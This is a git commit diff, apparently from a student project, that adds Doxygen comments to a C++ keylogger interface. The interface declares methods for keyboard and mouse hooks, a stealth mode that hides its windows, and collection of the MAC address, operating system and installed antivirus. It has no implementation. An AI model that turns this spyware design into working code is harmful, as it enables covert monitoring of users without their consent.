b39298a9e0c689a16036321f32c62362a4ae2401
Jeremy Thoveron <jeremy.thoveron-@epitech.eu>
2017-10-04 19:21:07 +0200

    ajout des commentaires pour doxygen. Suppression de variables inutiles

--- includes/IKeyLogger.hpp
+++ includes/IKeyLogger.hpp
@@ -20,11 +20,23 @@
 class 		IKeyLogger
 {
 public:
+
+  ///brief init the hooks for the mouse and the keyboard
   virtual void		initHooks() = 0;
+
+  ///brief init the stealth mode to be sure that no windows is displayed when the keylogger is launched
   virtual void		stealth() = 0;
+
+  ///brief release the hooks for the mouse and the keyboard
   virtual void		unHooks() = 0;
+
+  ///brief retrieve the address mac
   virtual void		getMacAddr() = 0;
+
+  ///brief retrieve the operating system
   virtual void		getOperatingSystem() = 0;
+
+  ///brief retrieve the anti virus of the computer
   virtual void		getAntiVirus() = 0;
 };
 
